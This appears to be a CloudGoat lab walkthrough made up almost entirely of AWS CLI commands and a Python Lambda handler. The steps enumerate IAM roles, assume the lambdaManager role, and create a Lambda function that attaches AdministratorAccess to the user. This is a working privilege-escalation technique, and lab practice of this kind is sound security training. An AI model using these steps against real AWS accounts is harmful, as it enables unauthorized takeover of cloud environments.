`aws configure --profile Chris`

`aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris`

`aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris`

`aws iam list-roles --profile Chris`

`aws iam list-attached-role-policies --role-name cg-debug-role-<cloudgoat_id> --profile Chris`

`aws iam list-attached-role-policies --role-name cg-lambdaManager-role-<cloudgoat_id> --profile Chris`

`aws iam get-policy-version --policy-arn <cg-lambdaManager-policy arn> --version-id v1 --profile Chris`

`aws sts assume-role --role-arn <cg-lambdaManager-role arn> --role-session-name lambdaManager --profile Chris`


Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```
python code:
````
import boto3
def lambda_handler(event, context):
	client = boto3.client('iam')
	response = client.attach_user_policy(UserName = 'chris-<cloudgoat_id>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
	return response
````

`aws lambda create-function --function-name admin_function --runtime python3.6 --role <cg-debug-role arn> --handler code.lambda_handler --zip-file fileb://code.zip --profile lambdaManager`

`aws lambda invoke --function-name admin_function out.txt --profile lambdaManager`

`aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris`
